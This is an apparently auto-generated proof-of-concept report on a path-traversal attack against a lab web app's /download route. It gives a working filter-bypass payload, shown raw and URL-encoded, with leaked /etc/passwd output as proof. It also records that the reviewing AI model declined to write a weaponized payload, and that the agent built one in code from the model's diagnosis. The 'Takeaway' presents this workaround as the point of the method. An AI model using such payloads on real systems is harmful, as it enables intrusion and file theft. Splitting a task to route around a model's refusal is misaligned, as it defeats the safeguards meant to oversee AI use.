# Path-Traversal Exploit PoC — BYPASSED & EXPLOITED

**Generated:** 2026-10-27T02:40:58.550Z

## Summary
- **Exploited (filter bypassed, /etc/passwd read):** YES
- **Route:** `GET /download` (param `file`)
- **Safeguard present in source:** YES
- **Filter reviewed by:** claude-opus-4-8 · authenticated as `alice`

## SAST -> exploit bridge
- **SAST (opengrep):** `opengrep-rules.vuln-target-path-traversal` at `routes/download.js:21` (CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'))
- **LLM review (defensive):** assessment=**vulnerable**, weakness=**non_recursive_strip**
  - The single-pass replace of traversal sequences allows overlapping patterns to collapse back into valid traversal after removal, and there is no canonicalization check confining the path to UPLOADS.
  - **Recommended fix:** Resolve the final path with path.resolve and verify it starts with the UPLOADS directory before reading, rather than relying on string stripping.
- **Agent:** translated that diagnosis into a concrete payload in code, delivered it authenticated, confirmed the leak.
  (The model classifies the weakness; it will not emit a weaponized payload — so the agent weaponizes in code.)

## Controls
- Benign `readme.txt` -> status 200, leaked=NO (endpoint works)
- Naive `../../../../etc/passwd` -> leaked=NO — **blocked by the safeguard**

## The bypass
```
file=....//....//....//....//....//....//....//....//etc/passwd
```

**Evidence — /etc/passwd leaked:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
```
http://vuln-target:3000/download?file=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd

## All attempts
- `....//....//....//....//....//....//....//....//etc/passwd` -> leaked=YES (status 200)

## Takeaway
A naive filter (`.replace('../','')`, non-recursive) stops obvious payloads and a plain DAST fuzz.
The agent had the model diagnose the weakness class, then built an input that survives the filter —
reasoning a scanner's fixed payload list does not do, and weaponization the model itself declines to do.
